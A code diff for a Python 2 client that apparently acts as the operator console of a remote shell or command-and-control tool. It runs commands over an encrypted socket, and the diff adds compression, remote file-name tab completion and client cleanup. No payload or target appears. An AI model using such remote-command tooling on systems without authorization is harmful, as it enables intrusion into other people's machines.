@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 # from __future__ import unicode_literals
-import socket, sys, json, base64, random, hashlib, signal, threading, time
+import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib
 from prompt_toolkit import prompt
 from Crypto.Cipher import AES
 import readline
@@ -23,10 +23,16 @@ class Client:
 		self.prompt = self.cwd + ">>"
 		
 	def encrypt(self, data):
-		return base64.b64encode(self.aes_obj.encrypt(data))
+		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
 		
 	def decrypt(self, data):
-		return self.aes_obj.decrypt(base64.b64decode(data))
+		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
+		
+	def compress(self, data):
+		return zlib.compress(data, 9)
+		
+	def decompress(self, data):
+		return zlib.decompress(data)
 		
 	def send(self, data):
 		self.sock.sendall(self.encrypt(data))
@@ -58,8 +64,21 @@ class Client:
 							
 		self.prompt = self.prompt.strip()
 		
+	def tab_completer(self, text, state):
+		self.send("LIST_FILES "+text)
+		data = self.recv()
+		data_package = json.loads(data)
+		for key in data_package:
+			data_package[key] = base64.b64decode(data_package[key])
+		files = data_package["data"].split("|")
+		return str(files[state])
+		
 	def interact(self):
 		print "starting interaction"
+
+		readline.parse_and_bind("tab: complete")
+		readline.set_completer(self.tab_completer)
+		
 		while True:
 			try:
 				user_input = raw_input(u"\n" + unicode(self.prompt, errors='ignore') + " ")
@@ -70,6 +89,7 @@ class Client:
 				print "Available commands:\n prompt - change prompt"
 			else:
 				try:
+					if not user_input: continue
 					self.send(user_input)
 					
 					data = self.recv()
@@ -83,8 +103,8 @@ class Client:
 					sys.stdout.write(data_package["data"])
 				
 				except Exception as e:
-						print "Something went wrong" 
 						print e
+						del handler.clients[self.id]
 						break
 		
 
